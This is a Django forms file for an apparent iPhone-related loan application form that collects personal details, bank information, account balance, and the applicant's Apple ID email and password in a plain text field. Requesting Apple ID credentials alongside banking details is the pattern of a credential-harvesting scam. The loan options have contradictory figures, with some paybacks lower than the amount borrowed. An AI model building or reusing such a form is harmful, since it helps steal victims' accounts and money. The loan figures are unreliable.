from django import forms
from .models import iphoneclose

from localflavor.us.models import USStateField
from localflavor.us.forms import USStateSelect
from django.contrib.auth.forms import AuthenticationForm

loan_choices = (
('$3000', '$3000 for 36 months = $90.83 each month. (Your total payback to the company would be $3270 with interest rate 9%)'),
('$1000', '$1000 for 12 months = $90.83 each month. (Your total payback to the company would be $1090 with interest rate 9%)'),
('$1500', '$1500 for 12 months = $136.25 each month. (Your total payback to the company would be $1090 with interest rate 9%)'),
('$2000', '$2000 for 24 months = $90.83 each month. (Your total payback to the company would be $2180 with interest rate 9%)'),
('$2500', '$2500 for 24 months = $113.54 each month. (Your total payback to the company would be $2180 with interest rate 9%)'),
('$3000', '$3000 for 36 months = $90.83 each month.. (Your total payback to the company would be $3270 with interest rate 9%)'),
('$3500', '$3500 for 24 months = $105.97 each month. (Your total payback to the company would be $2180 with interest rate 9%)'),
('$4000', '$4000 for 48 months = $90.83 each month. (Your total payback to the company would be $4360 with interest rate 9%)'),
('$4500', '$4500 for 48 months = $102.18 each month. (Your total payback to the company would be $4360 with interest rate 9%)'),
('$5000', '$5000 for 60 months = $90.83 each month. (Your total payback to the company would be $5450 with interest rate 9%)'),
('$5500', '$5500 for 60 months = $99.91 each month. (Your total payback to the company would be $5450 with interest rate 9%)'),
('$6000', '$6000 for 72 months = $90.83 each month. (Your total payback to the company would be $6540 with interest rate 9%)'),
('$6500', '$6500 for 72 months = $98.40 each month. (Your total payback to the company would be $6540 with interest rate 9%)'),
('$7000', '$7000 for 84 months = $90.83 each month. (Your total payback to the company would be $7630 with interest rate 9%)'),
('$7500', '$7500 for 84 months = $97.32 each month. (Your total payback to the company would be $7630 with interest rate 9%)'),
('$8000', '$8000 for 96 months = $90.83 each month. (Your total payback to the company would be $8720 with interest rate 9%)'),


)
class iphonecloseform(forms.ModelForm):

	first_name = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "First Name"}))
	last_name = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Last Name"}))
	email = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Email"}))
	phone = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Phone Number"}))
	address = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Address"}))
	city = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "City"}))
	state = forms.CharField(widget=USStateSelect(attrs={"class":"form-control required", "placeholder": "USStateSelect"}))
	zip_code = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Zip Code"}))
	loan_amount = forms.ChoiceField(choices = loan_choices, widget=forms.Select(attrs={"class":"form-control required", "placeholder": "Select Loan"}))
	payment_date = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "For example: 2nd"}))
	bank_name= forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Your Bank Name"}))
	since_how_long_banking = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Since How long You Are Banking With Them?"}))
	online_banking_status = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Do You Do Online Banking With Them?"}))
	current_balance_in_account = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Balance In The Account (Positive or Negative)?"}))
	Apple_ID = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Apple ID Email"}))
	password = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Apple ID Password"}))

	class Meta:
		model = iphoneclose
		fields = ('first_name', 'last_name', 'email', 'phone', 'address', 'city', 'state', 'zip_code', 'loan_amount', 'payment_date', 'bank_name', 'since_how_long_banking', 'online_banking_status', 'current_balance_in_account', 'Apple_ID','password')

